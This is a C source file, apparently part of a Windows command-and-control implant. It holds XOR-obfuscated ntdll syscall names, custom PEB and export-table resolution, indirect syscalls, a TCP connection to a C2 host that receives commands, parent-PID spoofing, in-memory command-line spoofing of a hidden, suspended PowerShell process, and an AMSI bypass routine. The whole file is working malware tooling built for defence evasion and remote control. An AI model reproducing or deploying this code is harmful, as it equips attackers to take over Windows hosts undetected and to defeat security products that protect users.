#include "helper.h"


void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz) {
    for (size_t i = 0; i < data_sz; i++) {
        data[i] ^= key[i % key_sz];
    }
}

UCHAR _NtAllocateVirtualMemory[] = { 0x3c, 0x0e, 0x25, 0x04, 0x03, 0x1f, 0x3c, 0x08, 0x07, 0x3a, 0x37, 0x36, 0x1c, 0x1d, 0x16, 0x04, 0x33, 0x2a, 0x10, 0x14, 0x1d, 0x08, 0x1d, 0x68 };
UCHAR _NtWriteVirtualMemory[] = { 0x3c, 0x0e, 0x33, 0x1a, 0x06, 0x04, 0x3a, 0x3f, 0x1a, 0x2d, 0x15, 0x2a, 0x0f, 0x05, 0x2e, 0x00, 0x32, 0x08, 0x07, 0x00, 0x72 };
UCHAR _NtProtectVirtualMemory[] = { 0x3c, 0x0e, 0x34, 0x1a, 0x00, 0x04, 0x3a, 0x0a, 0x07, 0x09, 0x08, 0x2d, 0x1a, 0x1c, 0x02, 0x09, 0x12, 0x02, 0x18, 0x16, 0x00, 0x03, 0x64 };
UCHAR _NtResumeThread[] = { 0x3c, 0x0e, 0x36, 0x0d, 0x1c, 0x05, 0x32, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x63 };
UCHAR _NtWaitForSingleObject[] = { 0x3c, 0x0e, 0x33, 0x09, 0x06, 0x04, 0x19, 0x06, 0x01, 0x0c, 0x08, 0x31, 0x09, 0x05, 0x06, 0x2a, 0x3d, 0x0d, 0x10, 0x1a, 0x06, 0x7a };
UCHAR _NtQueueApcThread[] = { 0x3c, 0x0e, 0x35, 0x1d, 0x0a, 0x05, 0x3a, 0x28, 0x03, 0x3c, 0x35, 0x37, 0x1c, 0x0c, 0x02, 0x01, 0x5f };
UCHAR __NtQueryInformationProcess[] = { 0x3c, 0x0e, 0x35, 0x1d, 0x0a, 0x02, 0x26, 0x20, 0x1d, 0x39, 0x0e, 0x2d, 0x03, 0x08, 0x17, 0x0c, 0x30, 0x09, 0x25, 0x0b, 0x1d, 0x19, 0x01, 0x1b, 0x1c, 0x70 };
UCHAR _NtReadVirtualMemory[] = { 0x3c, 0x0e, 0x36, 0x0d, 0x0e, 0x14, 0x09, 0x00, 0x01, 0x2b, 0x14, 0x3e, 0x02, 0x24, 0x06, 0x08, 0x30, 0x15, 0x0c, 0x79 };
UCHAR _NtCreateThreadEx[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x26, 0x1d, 0x5f };
UCHAR _NtOpenProcess[] = { 0x3c, 0x0e, 0x2b, 0x18, 0x0a, 0x1e, 0x0f, 0x1b, 0x1c, 0x3c, 0x04, 0x2c, 0x1d, 0x69 };
UCHAR _NtCreateEvent[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x36, 0x29, 0x04, 0x31, 0x1a, 0x69 };
UCHAR _NtCreateTimer[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x36, 0x0c, 0x3a, 0x1c, 0x69 };
UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };

VOID SetupConstants(){
    XOR(_NtAllocateVirtualMemory, sizeof(_NtAllocateVirtualMemory), key, sizeof(key));
    XOR(_NtWriteVirtualMemory, sizeof(_NtWriteVirtualMemory), key, sizeof(key));
    XOR(_NtProtectVirtualMemory, sizeof(_NtProtectVirtualMemory), key, sizeof(key));
    XOR(_NtResumeThread, sizeof(_NtResumeThread), key, sizeof(key));
    XOR(_NtWaitForSingleObject, sizeof(_NtWaitForSingleObject), key, sizeof(key));
    XOR(_NtQueueApcThread, sizeof(_NtQueueApcThread), key, sizeof(key));
    XOR(__NtQueryInformationProcess, sizeof(__NtQueryInformationProcess), key, sizeof(key));
    XOR(_NtReadVirtualMemory, sizeof(_NtReadVirtualMemory), key, sizeof(key));
    XOR(_NtCreateThreadEx, sizeof(_NtCreateThreadEx), key, sizeof(key));
    XOR(_NtOpenProcess, sizeof(_NtOpenProcess), key, sizeof(key));
    XOR(_NtCreateEvent, sizeof(_NtCreateEvent), key, sizeof(key));
    XOR(_NtCreateTimer, sizeof(_NtCreateTimer), key, sizeof(key));
}

void hexdump(char *data, size_t size) {
    const size_t width = 16;

    for (size_t i = 0; i < size; i += width) {
        printf("%08zx  ", i);

        for (size_t j = 0; j < width; j++) {
            if (i + j < size)
                printf("%02X ", (unsigned char)data[i + j]);
            else
                printf("   ");
        }
        printf(" ");
        for (size_t j = 0; j < width; j++) {
            if (i + j < size) {
                unsigned char c = data[i + j];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
        }
        printf("\n");
    }
}

DWORD Djb2W(BYTE* Data) {
    ULONG Hash = 0x67 + 0x420;
    INT c;

    while(c = *Data++) {
        Hash = ((Hash << 6) + Hash) + c;
    }

    return Hash;
}

BOOL ConnectToC2(SOCKET* c2Socket){
    WSADATA wsaData;
    *c2Socket = INVALID_SOCKET;
    struct sockaddr_in c2Address = { 0 };

    printf("[C2] C2 implant by 0xRzdhop activated !\n");
    WSAStartup(MAKEWORD(2, 2), &wsaData); //initialisation de la DLL Winsock par le process

    printf("[C2] Creating TCP/IP socket\n");
    *c2Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    c2Address.sin_family = AF_INET;
    c2Address.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &c2Address.sin_addr);


    printf("[C2] Connecting to C2 (%s:%d)\n", HOST, PORT);
    connect(*c2Socket, (struct sockaddr*)&c2Address, sizeof(c2Address));

    printf("[C2] Connected ! \n");
}

VOID recvC2Packet(SOCKET* c2Socket, PC2_PACKET receivedPacket){
    int         recvResult = 0;
    SIZE_T      totalBytesReceived = 0;
    BYTE*       packetCursor = (BYTE*)receivedPacket;

    printf("[Implant] Waiting for C2_PACKET (%llu bytes)\n", (unsigned long long)sizeof(C2_PACKET));
    while (totalBytesReceived < sizeof(C2_PACKET)) {

        recvResult = recv(*c2Socket,
            (char*)(packetCursor + totalBytesReceived),
            (int)(sizeof(C2_PACKET) - totalBytesReceived),
            0
        );

        if (recvResult <= 0) printf("[C2][ERR] recv() failed or connection closed (%d)\n", WSAGetLastError());
        else if (recvResult == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) {
                Sleep(1); // On attend un micro-instant que le buffer se remplisse
                continue;
            }
            return; // Erreur fatale
        } else {
            return; // Connexion fermée
        }
        
        totalBytesReceived += recvResult;
    }
    
    printf("[C2] Packet fully received\n");
    printf("[C2] Command ID : %lu\n", receivedPacket->CmdId);
}

int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID){
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to take snapshot\n");
        return 0;
    }

    if (!Process32First(snapshot, &pe32)) {
        printf("[-] Failed to get first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmpi(pe32.szExeFile, lpName) == 0) {
            printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
            *PID = pe32.th32ProcessID;
            *hProc = WrapperOpenProcess(*PID);
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return 1;
}
HMODULE CustomGetModuleHandleW(LPCWSTR moduleName){
    HMODULE hModule = 0;
    size_t moduleName_sz = lstrlenW(moduleName);   

    //TEB (GS:0x30) + offset PEB (0x30)
    //printf("[*] Getting PEB via GS+offset(0x60)\n");
    PPEB pPeb = (PPEB)__readgsqword(0x60); // PPEB ProcessEnvironmentBlock;

    //printf("[*] Getting PEB_LDR_DATA via PEB\n");
    PPEB_LDR_DATA Ldr = pPeb->Ldr;//PPEB_LDR_DATA LoaderData

    PLIST_ENTRY _InMemoryOrderModuleList = &Ldr->InMemoryOrderModuleList;
    //printf("[*] Getting lists of _LDR_DATA_TABLE_ENTRY via LoaderData::InMemoryOrderModuleList\n");
    //printf("[*] Iterating InMemoryOrderModuleList\n");
    int DoneFlag = 0;
    for (PLIST_ENTRY currElem = _InMemoryOrderModuleList->Flink; (currElem != _InMemoryOrderModuleList) && !DoneFlag; currElem = currElem->Flink){
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)currElem - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        LPCWSTR BaseName = wcsrchr(entry->FullDllName.Buffer, L'\\')+1;

        if (!_wcsnicmp(moduleName, BaseName, moduleName_sz)) { //Case insensitive
            //printf("[*] Found Module '%ls' !\n", moduleName);
            //printf("[*] %ls DllBase (HMODULE) : 0x%p \n", BaseName, entry->DllBase);
            hModule = (HMODULE)entry->DllBase;
            DoneFlag = 1;
        } //else printf("[Debug] Skiping '%ls' ('%ls')\n", BaseName, entry->FullDllName.Buffer);
    } 

    return hModule;
}

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PBYTE pBase = (PBYTE) hModule;

    //Cast DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        //printf("[-] Erreur de recuperation du DOS Header\n");
		return NULL;
    }

    //Get NTHeader ptr from DOS header
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		//printf("[-] Erreur de recuperation du NtHeader\n");
        return NULL;
    }

    //Get Optionalheader for NTHeader
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (strcmp(lpProcName, pFunctionName) == 0) {
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

LPCWSTR ConvertDataToLPCWSTR(BYTE* Data) {
    if (!Data) return NULL;
    int dataSize = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, NULL, 0);
    LPWSTR dataW = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize * sizeof(WCHAR));
    if (dataW) {
        MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, dataW, dataSize);
    }
    return (LPCWSTR)dataW;
}

BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {
    HANDLE hHeap = GetProcessHeap();
    *ppReadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
    
    if (*ppReadBuffer == NULL) return FALSE;

    SIZE_T sNmbrOfBytesRead = 0;
    if (!WrapperReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead)) {
        printf("[!] ReadProcessMemory Failed : %u\n", GetLastError());
        HeapFree(hHeap, 0, *ppReadBuffer);
        *ppReadBuffer = NULL;
        return FALSE;
    }
    return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten  = 0;

    if (!WrapperWriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

BOOL GetProcOutput(HANDLE g_hChildStd_OUT_Rd, PBYTE bufferSTDOUTPUT, DWORD bufferSize) {
    DWORD dwRead;
    BOOL bSuccess = FALSE;

    bSuccess = ReadFile(g_hChildStd_OUT_Rd, bufferSTDOUTPUT, (DWORD)bufferSize-1, &dwRead, NULL);
    if (!bSuccess || dwRead == 0) {
        printf("[!] Failed to read from child process output pipe. Error: %u\n", GetLastError());
        return 0;
    }

    bufferSTDOUTPUT[dwRead] = '\0'; // Null-terminate the output !
    CloseHandle(g_hChildStd_OUT_Rd);
    return 1;
}

HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine) {
    STARTUPINFOEXW SiEx = { 0 };
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    //Ensure that we create the process with a pipe so that we can capture the output
    //Setting attributes for the pipe
    // src : https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
    SECURITY_ATTRIBUTES saAttr; 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
    // Ensure the read handle to the pipe for STDOUT is not inherited.
    // So that thechild process can WR and no Rd from our process
    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
        exit(1);

    HANDLE hHeap = GetProcessHeap();
    PBYTE bufferSTDOUTPUT = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 10000);

    printf("[*] Spoofing PPID of %s\n", lpSpoofedProcPath);
    DWORD PID = 0;
    HANDLE hParentProcess = NULL;
    
    char *filename = strrchr(lpSpoofedProcPath, '\\');
    filename = (filename == NULL) ? (char *)lpSpoofedProcPath : filename + 1;
    
    get_process(filename, &hParentProcess, &PID);
    if (!hParentProcess) {
        printf("[!] Failed to get parent process handle\n");
        return FALSE;
    }

    printf("[*] %s PID : %d\n", filename, PID);

    HANDLE hDuplicatedWr = NULL; 
    BOOL bDup = DuplicateHandle(
        GetCurrentProcess(),     // Get handle from current process
        g_hChildStd_OUT_Wr,      // the specific local handle
        hParentProcess,          // into this process handle's table
        &hDuplicatedWr,          // the handle duplicate generated
        0,         
        TRUE,                    // Inherit handle
        DUPLICATE_SAME_ACCESS
    );

    //Put the duplicated handle in the attribute list for the new process
    SiEx.StartupInfo.hStdOutput = hDuplicatedWr;
    SiEx.StartupInfo.hStdError = hDuplicatedWr;
    SiEx.StartupInfo.dwFlags |= STARTF_USESTDHANDLES; // Says that handles are available (our pipe)

    SIZE_T sThreadAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
    
    InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttList);
    
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList)) return FALSE;
    
    UpdateProcThreadAttribute(pThreadAttList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    SiEx.lpAttributeList = pThreadAttList;
    
    printf("[*] Starting process with Fake PPID...\n");
    
    // Buffer large pour éviter les débordements
    WCHAR fakeStartupArgs[1024] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
    size_t currentLen = lstrlenW(fakeStartupArgs);
    for (size_t i = currentLen; i < 1023; i++) {
        fakeStartupArgs[i] = L' '; // 0x0020
    }
    fakeStartupArgs[1023] = L'\0';

    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SiEx.StartupInfo, Pi)) {
        printf("[!] CreateProcessW Failed: %d\n", GetLastError());
        HeapFree(hHeap, 0, pThreadAttList);
        return FALSE;
    }

    CloseHandle(g_hChildStd_OUT_Wr); // We won't write to the child process, so we can close this end of the pipe

    // Close the duplicated handle
    HANDLE hTemp = NULL;
    DuplicateHandle(
        hParentProcess,          
        hDuplicatedWr,
        GetCurrentProcess(),
        &hTemp,                   // Get the duplicated handle back to be able to close it locally
        0, 
        FALSE, 
        DUPLICATE_CLOSE_SOURCE    // close the remote pipe handle
    );

    if (hTemp) {
        CloseHandle(hTemp); // Et on ferme la copie qu'on vient de ramener
    }

    // Résolution NtQuery
    //_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    DWORD dwNtQuerySSN = 0;
    PVOID pNtQuerySyscallPtr = NULL;
    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess", &dwNtQuerySSN, &pNtQuerySyscallPtr);

    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG ret = 0;
    //pNtQueryInformationProcess(Pi->hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);
    ULONG ntStatus = StealthCall(dwNtQuerySSN, pNtQuerySyscallPtr, 5, 
        (UINT64)Pi->hProcess, 
        (UINT64)0, // ProcessBasicInformation (0)
        (UINT64)&PBI, 
        (UINT64)sizeof(PROCESS_BASIC_INFORMATION), 
        (UINT64)&ret
    );

    if (ntStatus != 0) {
        printf("[!] NtQueryInformationProcess Failed with NTSTATUS: 0x%X\n", ntStatus);
        goto cleanup;
    }

    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
    
    if (!ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) goto cleanup;

    // Lecture des paramètres distants
    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS))) goto cleanup;
    
    SIZE_T effectiveArgs_bsz = (lstrlenW(procCmdLine) + 1) * sizeof(WCHAR); 
    
    printf("[*] Updating CommandLine.Buffer at %p\n", pParms->CommandLine.Buffer);
    WriteToTargetProcess(Pi->hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)procCmdLine, effectiveArgs_bsz);

    BYTE* remoteParamsBase = (BYTE*)pPeb->ProcessParameters;
    USHORT effectiveArgs_sz_us = (USHORT)effectiveArgs_bsz; 
    
    WriteToTargetProcess(Pi->hProcess, remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), &effectiveArgs_sz_us, sizeof(USHORT));
    WriteToTargetProcess(Pi->hProcess, remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength), &effectiveArgs_sz_us, sizeof(USHORT));

    printf("[*] Process manipulation done !\n");


    printf("[*] Applying VEH squared AMSI Bypass via APC queued PIC stubs...\n");
    printf("[!] Well no, it bypasses only the main thread of powershell, but it's still a really good demo of the technique !\n");
    printf("[!] The things is that it's an othert clr thread that loads AMSI and not the main thread, so we would need to apply the bypass on all threads of the process to be really effective, \n but that's a bit more work to do in C ad i don't know how to do that..!\n");
    ApplyVehBypass(Pi->hProcess, Pi->hThread);


cleanup:
    if(pPeb) HeapFree(hHeap, 0, pPeb);
    if(pParms) HeapFree(hHeap, 0, pParms);
    if(pThreadAttList) {
        DeleteProcThreadAttributeList(pThreadAttList);
        HeapFree(hHeap, 0, pThreadAttList);
    }
    
    return g_hChildStd_OUT_Rd;
}